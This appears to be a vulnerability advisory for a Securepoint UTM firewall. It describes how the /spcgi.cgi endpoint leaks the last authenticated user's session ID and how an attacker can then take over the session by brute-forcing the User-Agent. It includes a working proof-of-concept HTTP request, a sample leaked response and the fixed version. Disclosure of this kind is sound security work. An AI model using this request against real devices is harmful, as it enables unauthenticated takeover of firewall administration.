4. INTRODUCTION
===============
With secure networks, home office, site connectivity and the protection of your
data are easy to implement. UTM firewalls and VPN gateways from Securepoint secure
your networks - with suitable IT security solutions for small and medium-sized
businesses for rent, purchase or as a complete service.

(from the vendor's homepage)

5. VULNERABILITY DETAILS
========================
The firewall offers an administrative web panel on port 11115 and a user login panel
on port 443. Both offer the endpoint at "/spcgi.cgi" which leaks the "sessionid" of
the last active authenticated user to any unauthenticated user when the application
processes an invalid authentication attempt.

However, the attacker needs two more authentication attributes to be able to successfully
authenticate using the leaked sessionid:

1. The attacker must have the same REMOTE_ADDR as the user whose sessionid is leaked.
This isn't trivial to achieve, but exploitation is easy in configurations where any of the
two panels are NAT'ed.

2. The attacker needs to know the User-Agent of the user whose sessionid is leaked.
However, since the application does not enforce a rate limit on the authentication
endpoint, it is trivially easy to brute-force the User-Agent belonging to the leaked
session and then authenticate to the device. As the linked blog post describes, the
number of possible User-Agents can be further reduced.

Interestingly this exploit works across both authentication panels, so an attacker
can also leak the sessionId of an administrator using the user login interface and vice
versa.

Successful exploits can allow an unauthenticated attacker to authenticate against
the administrative interface without knowing the user's password. If the last
authenticated user has administrative privileges, this means a complete compromise
of the device since it is trivially easy to escalate from admin to root using legitimate
features.

6. PROOF OF CONCEPT
===================
Wait until a user successfully authenticates against the device and then issue an
invalid authentication attempt like:

POST /spcgi.cgi HTTP/1.1
Host: 192.168.175.1:11115
Content-Length: 86
Accept: */*
Content-Type: application/json; charset=UTF-8
Connection: close

{"module":"auth","command":["login"],"sessionid":"","arguments":{"user":"","pass":""}}

The application then returns the last active user's sessionid:

{
"sessionid": "8d4602543120a48a4ec30762c5cad3fa",
"mode": "w",
"result": {
"module": "server",
"code": 401,
"status": "Unauthorized",
"message": "failure: access denied"
},
"version": "11.6"
}

This is also exploitable against the user interface on port 443.

7. SOLUTION
===========
Upgrade to version 12.2.5.1 or newer
